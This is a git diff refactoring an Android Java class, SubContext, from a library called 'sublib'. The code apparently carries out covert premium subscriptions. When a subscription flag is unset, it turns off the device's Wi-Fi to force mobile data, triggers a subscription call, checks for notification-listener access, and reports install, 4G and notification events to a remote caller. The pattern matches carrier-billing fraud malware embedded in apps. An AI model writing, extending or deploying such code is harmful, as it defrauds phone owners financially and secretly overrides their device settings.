@@ -17,13 +17,12 @@ import com.enhtmv.sublib.common.util.SubLog;
 import com.enhtmv.sublib.common.util.NetUtil;
 
 import static android.net.wifi.WifiManager.WIFI_STATE_DISABLED;
-import static com.enhtmv.sublib.common.SubSign.INSTALLED;
-import static com.enhtmv.sublib.common.SubSign.OPEN_4G_NETWORK;
-import static com.enhtmv.sublib.common.SubSign.OPEN_NOTIFICATION;
+import static com.enhtmv.sublib.common.SubEvent.*;
+
 
 public class SubContext {
 
-    private static SubCall callInstance;
+    private static SubCall subCall;
     private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
     private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";
 
@@ -36,7 +35,8 @@ public class SubContext {
     public SubContext(Context context, SubCall subCall) {
         this.context = context;
         setSubCall(subCall);
-        callInstance.r().i(INSTALLED);
+
+        SubContext.subCall.report(PING);
     }
 
     public void destroy() {
@@ -46,21 +46,21 @@ public class SubContext {
         }
     }
 
-    private void success() {
+    private void subSuccess() {
         SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
 
         SharedPreferences.Editor editor = shared.edit();
 
-        editor.putBoolean("success", true);
+        editor.putBoolean("sub_state", true);
 
         editor.apply();
     }
 
-    private boolean getSuccess() {
+    private boolean subState() {
         SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
 
 
-        return shared.getBoolean("success", false);
+        return shared.getBoolean("sub_state", false);
 
     }
 
@@ -71,7 +71,7 @@ public class SubContext {
             @Override
             public void run() {
                 try {
-                    String content = callInstance.meta();
+                    String content = subCall.meta();
 
                     callBack.callback(content);
 
@@ -93,13 +93,13 @@ public class SubContext {
             SubCallBack<String> subCallBack = new SubCallBack<String>() {
                 @Override
                 public void callback(String string) {
-                    success();
+                    subSuccess();
                 }
             };
 
             subCall.init(packageName, androidId, subCallBack);
 
-            callInstance = subCall;
+            SubContext.subCall = subCall;
         }
     }
 
@@ -112,18 +112,20 @@ public class SubContext {
     public void call() {
 
         //是否订阅成功
-        if (!getSuccess()) {
+        if (!subState()) {
 
             new Thread(new Runnable() {
                 @Override
                 public void run() {
                     try {
 
-                        if (!StringUtil.isEmpty(callInstance.meta())) {
+                        String meta = subCall.meta();
+
+                        if (!StringUtil.isEmpty(meta)) {
 
                             //关闭wifi
                             if (wifiStateAndClose()) {
-                                callInstance.call();
+                                subCall.sub(meta);
                             }
                         }
 
@@ -141,14 +143,11 @@ public class SubContext {
 
     public static void call(final String message) {
 
-        if (callInstance != null) {
+        if (subCall != null) {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
-
-                    if (callInstance != null) {
-                        callInstance.call(message);
-                    }
+                    subCall.onSub(message);
                 }
             }).start();
         }
@@ -193,7 +192,7 @@ public class SubContext {
             return false;
         }
 
-        callInstance.r().s(OPEN_4G_NETWORK);
+        subCall.report(OPEN_4G_NETWORK);
         return true;
     }
 
@@ -211,7 +210,8 @@ public class SubContext {
                 if (cn != null) {
                     if (TextUtils.equals(pkgName, cn.getPackageName())) {
 
-                        callInstance.r().s(OPEN_NOTIFICATION);
+                        subCall.report(OPEN_NOTIFICATION);
+
 
                         return true;
                     }
@@ -247,7 +247,7 @@ public class SubContext {
 
                         SubLog.w("cancel notification permission");
 
-                        callInstance.r().w("cancel of notification authorization");
+//                        subCall.r().w("cancel of notification authorization");
 
                     }
                 });
@@ -279,9 +279,9 @@ public class SubContext {
                     SubLog.w("current wifi state or not network");
                 } else {
 
-                    SubLog.i("onReceive call");
+                    SubLog.i("onReceive subCall");
 
-                    callInstance.r().s(OPEN_4G_NETWORK);
+                    subCall.report(OPEN_4G_NETWORK);
 
                     callBack.callback(null);
                 }
